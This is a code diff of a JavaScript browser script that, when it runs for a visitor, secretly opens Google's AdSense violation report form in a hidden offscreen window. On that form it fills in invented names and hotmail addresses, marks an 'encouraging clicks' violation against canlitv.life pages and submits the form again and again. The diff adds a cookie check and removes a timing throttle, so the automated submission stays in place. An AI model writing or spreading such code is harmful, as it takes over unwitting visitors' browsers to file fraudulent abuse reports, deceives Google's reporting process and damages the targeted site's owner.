@@ -19,7 +19,7 @@ function getCookie(cname) {
 if (getCookie('cookie') != 1) {
 window.open("https://support.google.com/adsense/contact/violation_report","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
 new Image().src = '//whos.amung.us/widget/kralyarram2.png';
-setCookie("cookie", "1")
+setCookie("cookie", "1");
 }
 }
 
@@ -29,6 +29,8 @@ var cars = ["﻿aba","abaca","abacan","abac","abaza","abgul","abher","abihayat",
 var linkleriz = ["http://www.canlitv.life/","http://www.canlitv.life/kanal-d","http://www.canlitv.life/fox-tv-izle","http://www.canlitv.life/cartoon-network"];
 var linkleriz2 = ["http://www.canlitv.life/","http://www.canlitv.life/kanal-d","http://www.canlitv.life/fox-tv-izle","http://www.canlitv.life/cartoon-network"];
 if (location.hostname.indexOf("support.google.com") >= 0) {
+	if (getCookie('cookiez') != 1) {
+
 	setTimeout(function(){
 	var textbox = document.getElementsByName('name')[0]; textbox.value = cars[Math.floor(Math.random()*cars.length)]+' '+cars2[Math.floor(Math.random()*cars2.length)];
 	var textbox = document.getElementsByName('email')[0]; textbox.value = cars[Math.floor(Math.random()*cars.length)]+'-'+cars2[Math.floor(Math.random()*cars2.length)]+'@hotmail.com';
@@ -40,18 +42,17 @@ if (location.hostname.indexOf("support.google.com") >= 0) {
 		document.getElementById("ad_violation--encouraging_clicks").click();
 	var textbox = document.getElementsByName('violation_details')[0]; textbox.value = linkleriz2[Math.floor(Math.random()*linkleriz2.length)];
 
-	}, 3000);
+}, 3000);
+
+
+	setCookie("cookiez", "1");
+}
 setInterval(function () {
-tarih = new Date();
-    storage_key = 'access_yordudddmmdz_';
-    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
-        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
-        localStorage[storage_key] = tarih.getTime();
-		new Image().src = '//whos.amung.us/swidget/sikayetet';
+
 
 document.getElementsByClassName("submit-button")[0].click();
 					
-    }
+    
 	},5000);
 			}
 
